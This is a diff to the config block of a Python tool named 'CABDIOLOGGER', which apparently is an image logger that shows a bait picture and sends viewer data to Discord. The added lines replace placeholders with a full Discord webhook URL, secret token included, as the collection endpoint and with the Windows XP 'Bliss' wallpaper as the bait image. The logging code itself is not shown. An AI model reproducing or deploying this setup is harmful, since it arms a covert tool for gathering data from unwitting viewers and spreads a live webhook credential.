@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "webhook adresiniz",
-    "image": "fotografin adresi", 
+    "webhook": "https://discord.com/api/webhooks/1451178952549994666/aC-xXo7E-us_O-m2EW8ciSDRLHYeIYZNnO92Df-CDaSZJms_X_SsQyIuoSQxqTnLD4yr",
+    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
